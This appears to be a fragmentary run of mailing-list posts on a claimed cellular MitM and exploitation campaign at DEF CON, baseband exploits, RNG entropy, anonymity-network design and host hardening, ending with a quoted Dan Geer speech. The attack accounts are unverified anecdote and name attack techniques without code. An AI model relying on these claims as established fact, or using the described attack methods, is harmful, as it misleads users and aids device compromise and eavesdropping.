encrypted/digested product to the host entropy pool with the specified
entropy density estimate adjusted downward to your requirements. (most
OS'es support this)

---------- Forwarded message ----------
while most were enjoying libations or talks a very interesting event
was taking place at the conference.
we're all familiar with the hostility of WiFi and GSM networks at DEF
CON, however, this year the most hostile network on earth was not
802.11; it was CDMA and 4G!
on Friday some parts of Anon and Lulz made appearance. by early
Saturday morning a weapon was deployed.
some characteristics:
- full active MitM against CDMA and 4G connections from Rio to carriers.
- MitM positioning for remote exploitation to ring0 on Android and PC.
- fall back to userspace only or non-persistent methods when
persistent rootkit unattainable.
- many attack trees and weaponized exploits. escalation from easy pwns
up to specialized techniques and tactics until success is achieved.
- simultaneous attack across CDMA and 4G connections using full power
in these LICENSED bands.
- operated continuously (except for outages :) from early Saturday
until 8am Monday.
- designed with intent: mass exploitation, reconnaissance,
exfiltration, eavesdropping.
how to tell if you met the beast at Rio:
- did you accept an upgrade for Android, Java, or other applications? (oops)
- did you notice 3G/4G signal anomalies, including full signal yet
poor bandwidth or no link?
- did you notice your Android at full charged plugged in, but dropping
to <50% charge once unplugged?
- did you notice 4G download speeds at quarter of usual, yet uploads
over twice as fast?
- did you notice Android services that immediately respawn when
killed? (Voice Search?)
- does your Android no longer connect to USB debugging yet adbd is alive?
- does your PC have an sshd that cannot be kill -9'd?
- did your Android crash - a hard freeze, and then take a long time to
...many other indicators, but for now that's sufficient to express the point.
if you met the beast, it seemed to have a nearly perfect success rate;
your odds not good.  in fact you probably didn't even notice as it
pilfered bytes off your devices and monitored your conversations.
i have waited over six DEF CONs to meet an adversary of this skill.
i was not disappointed.
did the talks suck this year because the good stuff is under NDA?
clearly a lot of you are selling out...

does anyone know more about the methods to be discussed by Andrew Case

the memory analysis of Tor seems interesting.
(do Tor Live CDs need a new kexec target for memtest sweeps / ram
zeroisation? :)
Traditional digital forensics encompasses the examination of data from
an offline or bdeadb source such as a disk image. Since the filesystem
is intact on these images, a number of forensics techniques are
available for analysis such as file and metadata examination,
timelining, deleted file recovery, indexing, and searching. Live CDs
present a large problem for this forensics model though as they run
solely in RAM and do not interact with the local disk. This removes
the ability to perform an orderly examination since the filesystem is
no longer readily available and putting random pages of data into
context can be very difficult for in-depth investigations. In order to
solve this problem, we present a number of techniques that allow for
complete recovery of a live CDbs in-memory filesystem and partial
recovery of its previously deleted contents. We also present memory
analysis of the popular Tor application as it is used by a number of
live CDs in an attempt to keep network communications encrypted and

these rates often are not useful. even busy secure web or VPN servers
use orders of magnitude less.
initialization of full disk crypto across an SSD RAID could consume
it, but that's the only "practical" use case i've encountered so far
that said, a typical host entropy gathering daemon is often
insufficient, and even off-die serial bus and other old skewl sources
were providing entropy in kbit/sec rates, not MByte/sec.
some (many?) HWRNG designs use bit accumulators that feed a register
that is read by a userspace instruction.
consider the following configuration:
- this register is collecting single bits from two high speed
oscillators that is sub-sampling single bits at a quarter clock.
- only whitened / non-run bits collected, as set in a configuration
write / initialization.
in short: providing slow, non-deterministic output rates to this
entropy instruction.
if the instruction is configured to not-block, you could starve the
available pool in one thread, in one process, by using it
if the instruction is configured to block, you could introduce
significantly processing delays (unexpectedly so?) to other consumers
in other threads of execution, or other processes.
Intel did an end run around this problem with the DRBG, which is
similar to urandom, in the sense that it does not provide a 1:1
correlation of entropy in the system to entropy bits returned out, as
you may get in /dev/random linux behavior, which blocks once the
kernel entropy pool is exhausted. (that's another rant/tangent. let's
not go there :)
it is also seeding from the physical noise sources, running sanity
checks of some type, and then handing over to DRBG. so there is
clearly more involved than just a call to AES-NI. 3x as expensive
doesn't sound unreasonable if the seeding and validation overhead is
that's a great idea, and my reading of it is that they have said as
much. perhaps they should more clearly state it so for the usual case.
my understanding is that you will never fail unless the hardware
itself "starts up"? with a broken physical source returning clearly
invalid bits.
E.g. "In the rare event that the DRNG fails during runtime, it would
cease to issue random numbers rather than issue poor quality random
as for stating that it should never "run dry", or fail to not return
bits as long as the instruction is working, no matter how frequently
it is invoked, see:
With respect to the RNG taxonomy discussed above, the DRNG follows the
cascade construction RNG model, using a processor resident entropy
source to repeatedly seed a hardware-implemented CSPRNG. Unlike
software approaches, it includes a high-quality entropy source
implementation that can be sampled quickly to repeatedly seed the
CSPRNG with high-quality entropy. Furthermore, it represents a
self-contained hardware module that is isolated from software attacks
on its internal state. The result is a solution that achieves RNG
objectives with considerable robustness: statistical quality
(independence, uniform distribution), highly unpredictable random
number sequences, high performance, and protection against attack.

my last comment for this sad, confused tangent of a thread;
  it has been accosted via conjecture with too much frequency *grin*
SCTP for congestion control of transparent proxy TCP/UDP traffic.
local classification of traffic allocates by protocol / use fairness
instead of aggregate tcp fairness. like bittorrent or aria2 parallel
traffic treated as distinct low priority unit of traffic, deferring to
higher priority low latency web traffic and messaging.
multi-homing / multi-path endpoints in SCTP would maintain concurrent
connection with distinct endpoints, avoiding predecessor, timing,
denial of service attacks present in reliable, ordered, single stream
edges would be screwed as you mention, unless they were full fledged
participants consistently. using a UDP based transport with LEDBAT or
other technique to keep broadband upstream unsaturated and unclogged
(no deep queues), allowing all broadband endpoints the ability to
contribute to a large shared network.
ORCHID IPv6 addressing with IPsec tunnels is intended to re-use
existing work, including well tested auth+privacy with datagram
padding in IPsec. SCTP+TLS would fit over top of IPv6 ORCHID endpoints
(using IPsec SAs) to transport signalling/keying and encapsulated
client traffic. part of this would also include lowest priority (lossy
reliable) SRMP type delivery of useful, less immediate information to
nodes. to some extent the ORCHID addresses could be thought of as
hidden service names and also circuit endpoints for a given IPsec
this set of:
a. critical signalling and keying traffic
b. high priority, interactive web traffic and messaging
c. lower priority bulk traffic, downloads, streaming media
d. best effort, latent bulk caching and exchange
are the classful shaping groups ordered inside of opaque SFQ outbound
queues at various improved/concurrent stratified dependent link
padding paths of IPsec telescopes carrying intermediate
hop(signalling) and bearer traffic.
combining better prioritization of traffic and consistent consumption
of traffic (deferring low priority packets and using opportunistic
caching strategies for network information respectively) obtains the
best performance out of the SFQ DLP paths with the lowest latency for
priority traffic.
still, so many details left as exercise for the reader ;)
sort of, for only parts; if you want a portable user space
implementation (or port) it's all custom. the joys of wild conjecture
include absurd timelines and technical effort for free...
rump is about as close as i've seen: this is not the least of "how to deploy a thing like this" concerns.
there is also no backward compatibility or slow transition from an
existing Tor network to something using UDP encapsulated IPsec

i've been contemplating a write up about this, but the problem is once
you advertise your methods they become less effective.
there really is "security through obscurity" in this sense; when at a
resource disadvantage, every little bit counts...
if i were to summarize what i have found effective against dedicated
and resourceful attackers (again, i can't go into details :) this
would be the top 5:
1. use a common distro, but rebuild critical components - bootloader,
initramfs, openssl, openssh, the kernel, gnutls, libgmp, use 64bit,
2. use isolation and RBAC, Qubes, VirtualBox, VMWare, Parallels,
remember that VM escapes are available and expected. defense in depth
can never be too deep.
3. use constrained network access - identify anomalies, control
bandwidth, firewall ingress and egress aggressively. this implies
constant monitoring to detect such events. (another exercise left to
the reader)
4. rootkit and backdoor your own systems - use the dirty tricks to
observe and constrain your system before someone else uses dirty
tricks to compromise your system.
5. don't forget physical security - this is the universal oversight
and most effective end run around all other operational and technical
security measures. there is a reason physical access so often implies
"game over" and why black bag jobs are still and will continue to be
effective against all targets.

some questions, some answers, ...
this means rebuild hardened versions of these libraries from source;
  excluding insecure cipher suites in an OpenSSL build for example,
  altering architecture optimizations, supported features, in others,
the goal being that an exploit targeted to a vanilla distribution will
more likely fail with observable error or crash, rather than succeed
many exploits are very brittle in this respect, with any change in
symbol offsets or capabilities rendering them completely ineffective.
virtualization implies chained exploits for full compromise. combined
with the above you've drastically increased the cost of a successful
attack with modest effort. the likelihood of detection (by appearing
vulnerable yet not being so) is also increased.
remember that VMMs and hypervisors are themselves potentially
vulnerable software systems suitable for hardening and customization.
data exfiltration can be very visible via network behavior if you're
paying attention.  cross referencing connection state in your upstream
router vs. local OS view of sockets can identify discrepancies where
compromise has concealed covert connections. malware communicating
directly on an ethernet or wireless adapter outside of the OS is also
visible at this junction.
this is mostly a variant of  at a kernel / system level.  like
notepad.exe connecting to the internet, there are some syscall, file
access, and network requests which are clearly anomalous and
indicators of compromise.
this is a storied tangent unto itself...
last but not least: you must develop a routine of continuous hardening
and improvement. these steps are not done once and finished; they are
elements within a larger strategy of operational rigor defending
against motivated and capable attackers. asking for my "hardened linux
build" is missing the point entirely!

one last cautionary tale:
some time back i used the techniques discussed to harden some Android
phones brought with me into a hostile environment. i had kernel level
protections in place, hardened the system configuration and services,
pared down apps to the minimum and constrained their access to the
file system and network. this was months of effort.
the first adversarial encounter went very well in my favor - all of
the attempts to exploit my devices were thwarted at these various
layers and via these protections, with the sole exception of a Google
Voice Search hack that kept voice search active in an "open mic night"
eavesdropping capability.  this was quickly nullified via kill -STOP
(Android won't re-spawn an app that is already running, and a stopped
process proved quite effective at halting this repeated invocation of
search used to capture audio.)
fast forward to round two, and i doubled down on the kernel, system,
and application level protections. even more scrutiny is applied to
applications to avoid the misuse of legitimate functionality for
malicious purpose.  i am feeling confident!
... and then a baseband exploit easily walks under all of my
protections at every layer, completely and fully 0wning my devices,
with the only hint at anything amiss being the elevated thermal
dissipation and power consumption from the radios performing data
transmission, all while the Android OS believed the devices were
silent in airplane mode.
[informative interlude: software defined transceivers should be in
every hacker toolbox; radio level attacks are otherwise invisible to
you. they are also useful for many other purposes, perhaps one day
even providing a solution to the untrustworthy proprietary firmware
and baseband systems crammed into every mobile device these days.]
incidentally, this also demonstrates why IOMMU / VT-d guest isolation
of devices on the host bus is very useful, as a vulnerable NIC could
otherwise provide complete access to privileged memory and interfaces
just like the baseband exploit above...  assuming your CPU itself is
"trusting trust" continues to be a persistent and difficult problem,
leaving us all vulnerable to some degree or another - it's just a
function of cost and skill to compromise.  turtles all the way down!

"I'm sorry. My responses are limited. You must ask the right questions."
weaponized baseband exploits are difficult, expensive, architecture
specific, and not used capriciously.
this, among other reasons, is why there is such a dearth of
information on them despite being proven exploitable with a wide
attack surface for many years.
Rupp said state-sponsored attackers are already using baseband
processor attacks in airports but declined to go into details beyond
saying that attacks could be carried out without the need to trick
smartphones owners into opening an email or visiting a malicious
website. Attacks might involve building a rogue GSM base-station from
commodity hardware or run from the infrastructure of a 'co-operative"
telco. It might also be possible to run attacks against baseband
processors of phones using Wi-Fi or Bluetooth interfaces, according to
GSMK Cryptophone.
"Once you have control over the app CPU, you can in principle use that
to load any code you want from the network," Rupp explained. "Since
you have already successfully escalated your privileges on the system,
no user interaction is necessary."

and to StealthMonger's point about latest generation mix networks for
best privacy, why not instead focus on building low latency protocols
that are resistant to traffic analysis and confirmation?
make them datagram based; utilize user space stacks and latest
research.  solving the low latency datagram anonymity problem enables
existing usable private communication with the additional benefit of
endpoint and peer anonymity.
i believe this possible to make useful, even if never infallible.
certainly more possible than the odds of making truly scalable,
available, and _usable_ mix mailer networks and clients for the
most important: make this low latency infrastructure usable and cross

the best kind of problems!
correct. i mention them as a prerequisite for both protection and usability.
protection for example, with end-to-end SCTP multi-homed endpoints via
userspace stacks would avoid predecessor attacks - if you block one
route there are others which transit traffic, maintaining an
uninterrupted session across otherwise individually volatile paths.
usability for example to support UDP traffic and applications which
are not currently served via TCP and connection oriented services.
sadly, even TCP re-invented in user space is insufficient. you want a
specific protocol implementation of multi-homed SCTP in userspace,
probably on top of other protocol supports like LEDBAT or AQM. perhaps
using ORCHID IPv6 identifiers for endpoint addressing. lot's of
options; and as you said: it's a hard problem!
this is a separate problem. for the core transport encapsulation in
UDP may be sufficient. for censorship avoidance you will likely need
to bounce over a DUST like path first to access such an anonymizing
network. topology is an interesting subject, as the design must be
decentralized but may not need to be homogenous.
you want variable latency at the datagram level (e.g. stochastic
reordering and shaping of traffic, with prioritization done at the
endpoint where flows are visible.) more than the utmost in
performance. as long as it is overall TCP fair of course :)
and this is just the start. we haven't touched on network discovery,
path awareness/selection/weighting, etc.  as you said, hard problems;
the best kind of problems!

References: i should clarify:
the mode of operation for this presumed design and implementation is
to have SOCKS, HTTP, HTTPS, transparent UDP, transparent TCP,
transparent DNS (this is indeed different than just UDP :), and some
subset of transparent ICMP proxy support on the client / node.  you
could configure proxy settings, direct traffic to the trans ports, or
perform queries directly against the DNS port of the running real time
datagram mixer instance.
at the exits for public traffic or at the private ORCHID based
"hidden/overlay" endpoints, you transit these same protocols, per
advertised support in exit policy or overlay service capability
on the wire, you would be sending UDP datagrams that encapsulate the
NAT busting IPsec telescope containing path data, multi-path SCTP in
userspace for reliable TCP stream transport over the datagram overlay.
for all intents and purposes these packets would look like AH/ESP or
CryptoBox wrapped opaque cipher texts in some standard UDP
as for ATM, SONET, satellite data terminals, metro wireless, and all
other unusual or exotic transports: these are likely not useful for
the core network unless directly public UDP IPv4 reachable.
censorship bypass, non-node capable devices like phones, or very poor
network connectivity situations, would require other transports and
protocols for this initial tunnel into the overall real-time datagram
mix-like network.  in this context, the varied physical layers and
logical paths in a given metro region operating beneath IP routing can
play a role in passing traffic from suppressed/blocked users out to
the broader mesh or internet at large.
devices and users communicating via obfuscated links into the dgm
network do not have traffic analysis protections like full
participants.  despite this lack of stronger anonymity, the actors
observing at the edge can only note that you are tunneling into the
public network, and utilizing some stochastic gradient of bandwidth in
aggregate for some period of time.
this is still not much information, especially compared to the current
state of affairs!
there are many complications and constraints around how this would
work - i make it sound so easy ;)
  however, you could provide such services, including wireless metro
area mesh or p-to-mp distribution networks, constrained by propinquity
and referral by reputation, in combination with broadband internet
uplink of a more traditional sort where available.
and in fact, using multiple paths / transports concurrently provides
advantage for data continuity and throughput despite volatile and
changing upstream link availability on an individual basis to
particular gateway or router or access point devices.
metro area mesh benefits nicely from some backhaul ad-hoc or fixed
plant high capacity point-to-point links over distance with short IP
routes; there is a good paper from early 2000's about using atheros
802.11a devices with a custom tertiary firmware and host driver to
bond eight devices into a single point-to-point link with an aggregate
throughput over three or four hundred megabit a second in transport
rate... or so i recall.  IPoATM on a OC12 or bigger to an internet
provider would absolutely be useful as an upstream sink within such a
i would love to see high degree mesh optimizer p-to-mp nodes applying
the latest high bit rate software defines radios for  backhaul and
security.  isolate each radio like a Pervices Noctar[0] or USRP B210
[1] into its own guest and isolate devices with VT-d enforced memory
access boundaries.  you may even put more than one device in a single
SDR Backhaul Guest VM if doing large-QAM or other complex MIMO

References: active attacks are often even more effective at rapid traffic
confirmation and analysis[0]; GPA is pretty tame perhaps!
in any case the challenge you mention: thwarting or preventing traffic
analysis without a full mix of constant traffic. if the datagram based
system above existed, combine with:
- stochastic fair queuing and re-ordering of egress traffic. by
"clamping" the outbound rate of randomized, re-ordered datagrams to a
broad "size/chunk" of capacity, you deter traffic confirmation,
anonymity set reduction, and other traffic analysis attacks of various
- client-side classification of application traffic into prioritized
classes[1] for ingress / dgm proxy level active shaping by classful
HTB queues before transiting the first hop and losing all visibility
into the content and priority of message payloads.
- integrate a lowest effort / unreliable background reliable multicast
like bulk transport channel for resource and key pre-caching, network
participant and performance information distribution, secure remote
archives, random performance measurement/tests across peer groups,
other low priority communications suited for this "filler" class of
traffic. (consuming more or less filler traffic helps smooth out the
effective throughput and efficiency when changing the broad
"stochastic traffic capacity range" appropriate for a given peer.)
- provide LEDBAT or AQM management of edge traffic to upstream(s) to
prevent unnecessary latency in upstream buffers. this ensures that
even at full utilization the responsiveness of the broadband link is
- and the multi-path SCTP, IPsec, UDP NAT traversal and encapsulation,
and other user space network stacks communicating across this overlay
network as discussed above for requisite application and control
communication support.
these techniques combined allow you to use still not insignificant
"stochastic traffic capacity ranges" instead of a constant fixed
amount of traffic to protect against these attacks.  these stochastic
ranges can be adjusted up or down as network performance and capacity
dictate. this protocol provides congestion control and TCP
friendliness while greatly reducing the amount of bandwidth consumed
relative to a traditional mix.
at best (in theory), an attacker with local active and global passive
methods on hand could discern anonymity sets for broad categories /
scales of possible communication usage.  E.g. anon set A exhibits
traffic utilization on the order of 1Mbps to 5Mbps, while anon set B
exhibits traffic utilization on the order of 5Mbps to 50Mbps, and anon
set C exhibits traffic utilization on the order of 50Mbps to 1Gbps,
given this drawback, code a kick ass client with participation enabled
by default if sufficient connectivity and resources are available.
you've now made these broad traffic volume sets nearly useless in a
practical / actionable sense.
congratulations! you've now got a traffic analysis resistant low
latency anonymity protocol, implementation, and network that nearly
anyone can participate in and contribute to. for my next magic hand
wave, a directory / route selection method that scales to billions of
peers while leveraging geographic propinquity and social peer groups
to constrain Sybil attacks and impact of bad actors.
next grow network capacity in a way that continually applies implicit
feedback from the network overall and peers directly and your
deterrence to these attacks begins to improve further over time,
perhaps even one day hitting a tipping point of prevalence and
persistence for de-facto victory in most threat models...
we can dream!
perhaps someone should toss up a Bitcoin donation address to support
work on detailed technical specifications, experimental prototypes,
maintaining clouds for continuous builds, regression checks, load
tests, and traffic analysis for quality measurement and security
could also use donations for bounties for identifying or exploiting
security or privacy vulnerabilities in the design and implementation
of this final generation anonymous network.  whoever sets this up
should probably use an onion to coordinate development and distribute
sources, other resources...

 a. control and signalling traffic - always takes precedence.
 b. real-time and interactive communications, but not video.

this is the crux; where the human meets the machine is always a large,

requirements and behavior.
in the order of precedence of security risks, much bigger holes must
be addressed before formal verification provides return on time

libraries, this doesn't apply to you. ;)

utility of quality measures can not be judged on superficial metrics
like "size in GB" or "processor hours".  anyone using this argument as

this is a great approach and fits in well with other security through
isolation defense in depth.  combining the strengths of formal
verification at critical core points within a system, and then
leveraging that robust core to isolate, constrain, mediate between
higher level applications seem most reasonable, tractable, with the
best return on time invested.

of course; the complete details will be slow to arrive, not least
because detailed description requires a demonstration in a
reproduction test setup, rather than reporting of actual traffic. :/
that said, useful aspects i'll certainly provide on whim or request.
the defining characteristics of the two types of attacks:
DC19 with DRT:
- "high power on-site", less descriminant attacks. target by and
limited to location.
- MitM for system, application, and protocol level attacks. Evilgrade,
MasterKey vulns, etc.  mostly known and a few 0day escalated attacks.
- favorite attack: "Google Voice Search" always-on eavesdropper
payload; Speex voice from all audible participants.
DC20 with Alexander's toys:
- "in the towers", highly targeted to specific devices, active over
wide metro area.
- baseband exploit vector for device key retrieval, memory and storage
forensics, exfiltration.
- PDoS attacks (bricked secondary devices used as fall back once
identified by call graph; ~20 hours)
- favorite attack: baseband pwn in airplane mode, with ex-filtration
over custom channel.
DC21: no appearance (observed).  speculation ongoing...
reversing attacker capabilities, toolkits, TTPs, humanpower/hours, a
much longer tangent.  but this assertion is based on correlation of
the observed power, capacity, and protocols in specific bands
implemented by the attacker with the capabilities of the DRT system.
multiple locations, terabytes of captured spectrum, patience and
as for who was operating it - unknown beyond the usual suspects, which
is a small set due to the restricted distribution of both the hardware
platform and the exploit kit atop it :)
i'll send more details once available.  the details and distribution
to be part of a separate FOIPA effort for US citizen security
enthusiasts that might be of interest to those following this thread.

and it should go without saying; don't use a third-party wallet service!
the bitcoin network is one of the most hostile networks in the world;
the trail of pwn is long and continuous.  wallet services, changes,
pools, casinos, just about every BTC denominated service is operating
at an elevated risk level traditionally seen in banking while running
their operations like a self hosted blog...

thought provoking read, as always. thanks Dan :)
this is worth posting whole, particularly this observation:
... polarization has come to cyber
security.  High end practice is accelerating away from the low end.
The best skills are now astonishingly good while the great mass of
those dependent on cyber security are ever less able to even estimate
what it is that they do not know, much less act on it.  This
polarization is driven by the fundamental strategic asymmetry of
cyber security, namely that while the workfactor for the offender
is the incremental price of finding a new method of attack, the
workfactor for the defender is the cumulative cost of forever
defending against all attack methods yet discovered.  Over time,
the curve for the cost of finding a new attack and the curve for
the cost of defending against all attacks to date must cross.  Once
those curves cross, the offender never has to worry about being out
of the money.  That crossing event occurred some time ago.
i do have one comment, per:
Everyone my age working in cyber security was trained for something
else, and because of that switch between one field and another
brings along the hybrid vigor of seeing the cyber security world
through a different lens.
instead of having a "cyber security" profession, all aspects of
"information security", "software security", or "cyber security" as a
specialization should not exist.  competence and experience with these
subjects should be considered part of routine software and systems
development practice. (right now this is mostly impractical, however,
it need not always be so...)

.Trends in Cyber Security
.Dan Geer, 6 November 13, NRO
Thank you for the invitation to speak with you today, which, let
me be clear, is me speaking as myself and not for anybody or anything
else.  As you know, I work the cyber security trade, that is to say
that my occupation is cyber security.  Note that I said "occupation"
rather than "profession."  On 18 September, the U.S. National Academy
of Sciences, on behalf of the Department of Homeland Security,
concluded that cyber security should be seen as an occupation and
not a profession because the rate of change is too great to consider
professionalization.[1]  You may well agree that that rate of change
is paramount and thus why cyber security is the most intellectually
demanding occupation on the planet.  In writing this essay, I will
keep my comments to trends rather than point estimates, just as you
asked in your invitation, but let me emphasize the wisdom of your
request by noting that the faster the rate of change, the more it
is trends that matter and not the value of any given variable at
any given time.  With luck, each of these trends will not be something
that you would argue with as a trend.  Argument, if any, will be
in their interpretation.
Note also that these trends do not constitute a set of mutually
exclusive, collectively exhaustive characterizations of the space
in which we live and work.  Some of them are correlated with others.
Some of them are newly emergent, some not.  Some of them are
reversible to a degree; some not reversible at all.  I am not, today
anyway, looking for causality.
Trend  Polarization
Much has been written about the increasing polarization of American
life.[2]  The middle is getting smaller whether we are noting that
only the middle class is shrinking, that it is the middle of the
country that is depopulating, that the political middle is lonelier
and lonelier, that both farms and banks are now only too small to
matter or too big to fail, that almost all journalism is now advocacy
journalism, that middle tier college education is a ticket to debt
and nothing else.
I submit that this trend towards polarization has come to cyber
security.  High end practice is accelerating away from the low end.
The best skills are now astonishingly good while the great mass of
those dependent on cyber security are ever less able to even estimate
what it is that they do not know, much less act on it.  This
polarization is driven by the fundamental strategic asymmetry of
cyber security, namely that while the workfactor for the offender
is the incremental price of finding a new method of attack, the
workfactor for the defender is the cumulative cost of forever
defending against all attack methods yet discovered.  Over time,
the curve for the cost of finding a new attack and the curve for
the cost of defending against all attacks to date must cross.  Once
those curves cross, the offender never has to worry about being out
of the money.  That crossing event occurred some time ago.
I'll come back to this first bullet at the end, but I mention it
first as polarization is becoming structural and of all the trends
the most telling.  You can confirm this by asking the best cyber
security people what they do on the Internet and what they won't
do on the Internet.  You will find it sharply different than what
the public at large does or will do.  The best people know the most,
and they are withdrawing, they are rejecting technologies.  To use
the words and style of the Intelligence Community, they are
Trend  Trends themselves
The idea that under the pressure of constant change about all you
can measure is the slope of the curve has gone from
don't-bother-me-with-math to everybody's-doing-it.  A Google search
for the phrase "information security trends" turns up 13,400 hits
and no two of the top ten are from the same source.  Consultancies
talk about what they are seeing in the back room, product vendors
talk about evolving needs, and reporters talk about what they are
seeing out on the street.
I am one of those folks.  A Wall Street colleague and I run the
Index of Cyber Security.[3]  The ICS is what is called a sentiment-based
index; if you are familiar with the US Consumer Confidence Index,[4]
then you already know what a sentiment-based index is.  Respondents
to the ICS are top drawer cyber security practitioners with direct
operational responsibility who share, each month, how their view
of security in several areas has changed since the month before.
Because there are no absolutes in cyber security, not even widely
agreed upon definitions of the core terms that make up cyber security
practice, a sentiment-based Index is, in fact, the best decision
support that can be done.
The Index asks the respondents monthly whether each of two dozen
different risks has gotten better, gotten worse, gotten a lot better,
gotten a lot worse, or stayed the same since the month before.  Out
of this, the Index of Cyber Security is calculated and released at
6pm on the last calendar day of the month, in further similarity
to the Consumer Confidence Index.  We write an analytic annual
report that I have given to the organizers for your further reading.
As an index of risk, a higher ICS number means higher risk.  That
risk number has risen, and seems likely to continue to rise.  It
is a composite trend line, but what is more interesting is that the
components of the risk are much more varied, i.e., what is the
dominating risk one month may not be the next.  We think that this
captures, in part, the dynamic nature of cyber security and does
so in a way not otherwise being done.  Respondents seem to agree
that the ICS does offer decision support to front-line people such
as themselves.
Trend  then, is that there is increasingly wide acceptance that
absolute measures are not worth seeking and a kind of confirmation
that cyber security is a practice, not a device.
Trend  Physics and its impact on data
As you well know, more and more data is collected and more and more
of that data is in play.  The general, round-numbers dynamic of
this trend are these: Moore's Law continues to give us two orders
of magnitude in compute power per dollar per decade while storage
grows at three orders of magnitude and bandwidth at four.  These
are top-down economic drivers and they relentlessly warp what is
the economically optimum computing model.  The trend is clear; the
future is increasingly dense with stored data but, paradoxically,
despite the massive growth of data volume, that data becomes more
mobile with time.
As is obvious, this bears on cyber security as data is what cyber
security is all about.  In 2007, Jim Gray gave a seminal talk[5]
about the transformation of science, coining the term "fourth
paradigm."  By that he meant that the history of science is that
science began as an endeavor organized around empirical observation.
After that came the age of theory -- theorizing as the paradigm of
what science did.  Then science became computational, again meaning
that the paradigm of what science did was to calculate.  His argument
for a fourth era was that of a paradigm shift from computational
science to data intensive science.  You here at NRO need no primer
on the power of that shift in paradigm, but I am here to tell you
that cyber security is embracing that fourth paradigm and it is
doing it now.
Ecology professor Philip Greear would challenge his graduate students
to catalog all the life in a cubic yard of forest floor.  Computer
science professor Donald Knuth would challenge his graduate students
to catalog everything their computers had done in the last ten
seconds.  It is hard to say which is more difficult, but everywhere
you look, cyber security practitioners are trying to get a handle
on "What is normal?" so that that which is abnormal can be identified
early in the game.  Behavioral approaches leading towards intrusion
detection are exactly the search for anomaly, and they are data
based.  The now-famous attack on RSA Data Security that led to RSA
buying Net Witness is an example of wanting to know everything so
as to recognize something.  I'm on the record at book length [6]
that the central organizing principle behind a competent security
program is to instrument your data sufficiently well that nothing
moves without it being noticed.  Physics has made it possible to
put computers everywhere.  Physics has made it possible to fill
them all with data.
Cyber security is barely keeping up, and not just because of two,
three, or four orders of magnitude in the physics upstream of the
Trend  Need for prediction
We all know that knowledge is power.  We all know that there is a
subtle yet important distinction between information and knowledge.
We all know that a negative declaration like "X did not happen" can
be only proven if you have the enumeration of *everything* that did
happen and can show that X is not in it.  We all know that a stitch
in time saves nine, but only if we know where to put the stitch.
We all know that without security metrics, the outcome is either
overspending or under protecting.
The more technologic the society becomes, the greater the dynamic
range of possible failures.  When you live in a cave, starvation,
predators, disease, and lightning are about the full range of
failures that end life as you know it and you are well familiar
with all of them.  When you live in a technologic society where
everybody and everything is optimized in some way akin to just-in-time
delivery, the dynamic range of failures is incomprehensibly larger
and largely incomprehensible.  The wider the dynamic range of
failure, the more prevention is the watchword.  As technologic
society grows more interdependent within itself, the more it must
rely on prediction based on data collected in broad ways, not
targeted ways.
Some define risk as the probability of a failure times the cost of
that failure.  To be clear, a trend in favor of making predictions
is a trend subsidiary to a trend in the cost of failure.  I've
written at length elsewhere about how an increasing downside cost
of failure requires that we find ways to be resilient, but not
resilient in the sense of rich redundancy, not resilient in the
sense of having quick recovery mechanisms, but resilient in the
sense of having alternate primary means that do not share common
mode risks.  As such, I strongly recommend that manual means be
preserved wherever possible because whatever those manual means
are, they are already fully capitalized and they do not share common
mode risk with digital means.
There is now more information security risk sloshing around the
economy than could actually be accepted were it exposed.  The
tournament now turns to who can minimize their risk the best, which,
in the civilian economy at large, means who can most completely
externalize their downside information security costs.  The weapons
here are perhaps as simple as the wisdom of Delphi, "Know thyself"
and "Nothing to excess" -- know thyself in the sense of quantitative
rigor and a perpetual propensity to design information systems with
failure in mind; nothing to excess in the sense of mimicking the
biologic world's proof by demonstration that species diversity is
the greatest bulwark against loss of an ecosystem.
Trend  Abandonment
If I abandon a car on the street, then eventually someone will be
able to claim title.  If I abandon a bank account, then the State
will eventually seize it.  If I abandon real estate by failing to
remedy a trespass, then in the fullness of time adverse possession
takes over.  If I don't use my trademark, then my rights go over
to those who use what was and could have remained mine.  If I abandon
my spouse and/or children, then everyone is taxed to remedy my
actions.  If I abandon a patent application, then after a date
certain the teaching that it proposes passes over to the rest of
you.  If I abandon my hold on the confidentiality of data such as
by publishing it, then that data passes over to the commonweal not
to return.  If I abandon my storage locker, then it will be lost
to me and may end up on reality TV.  The list goes on.
Apple computers running 10.5 or less get no updates (comprising
about half the installed base).  Any Microsoft computer running XP
gets no updates (comprising about half the installed base).  The
end of security updates follows abandonment.  It is certainly ironic
that freshly pirated copies of Windows get security updates when
older versions bought legitimately do not.
Stating the obvious, if Company X abandons a code base, then that
code base should be open sourced.  Irrespective of security issues,
many is the time that a bit of software I use has gone missing
because its maker went missing.  But with respect to security, some
constellation of {I,we,they,you} are willing and able to provide
security patches or workarounds as time and evil require.
Would the public interest not be served, then, by a conversion to
open source for abandoned code bases?  But wait, you say, isn't
purchased software on a general purpose computer a thing of the
past?  Isn't the future auto-updated smartphone clients transacting
over armored private (carrier) networks to auto-updated cloud
services?  Maybe; maybe not.  If the two major desktop suppliers
update only half of today's desktops, then what percentage will
they update tomorrow?
If you say "Make them try harder!," then the legalistic, regulatory
position is your position, and the ACLU is already trying that
route.  If smartphone auto-update becomes a condition of merchantability
and your smartphone holds the keying material that undeniably says
that its user is you, then how long before a FISA court orders a
special auto-update to *your* phone for evidence gathering?
If you say "But we already know what they're going to do, don't
we?," then the question is what about the abandoned code bases.
Open-sourcing abandoned code bases is the worst option, except for
all the others.  But if seizing an abandoned code base is too big
a stretch for you before breakfast, then start with a Public Key
Infrastructure Certifying Authority that goes bankrupt and ask "Who
gets the keys?"
Trend  Interdependence
The essential character of a free society is this: That which is
not forbidden is permitted.  The essential character of an unfree
society is the inverse, that which is not permitted is forbidden.
The U.S. began as a free society without question; the weight of
regulation, whether open or implicit, can only push it toward being
unfree.  Under the pressure to defend against offenders with a
permanent structural advantage, defenders who opt for forbidding
anything that is not expressly permitted are cultivating a computing
environment that does not embody the freedom with which we are
heretofore familiar.
Put concretely, the central expression of a free society is a free
market, and the cardinal measure of a free market is the breadth
of real choice -- choice that goes beyond color and trim and body
style to choices that optimize discordant, antithetical goal states.
The level of choice on the Internet is draining down.  You may revel
in the hundreds of thousands of supposedly new voices that have
found a way to chatter in full view.  You may note that new "apps"
for Android plus iPhone are appearing at over a thousand per day.
You may rightly remind us all that technology is democratizing in
the sense that powers once reserved for the few are now irretrievably
in the hands of the many.  What stands against that, and why I say
that it stands against that, is increasing interdependence.
We humans can design systems more complex than we can then operate.
The financial sector's "flash crashes" are an example of that;
perhaps the fifty interlocked insurance exchanges for Obamacare
will soon be another.  Above some threshold of system complexity,
it is no longer possible to test, it is only possible to react to
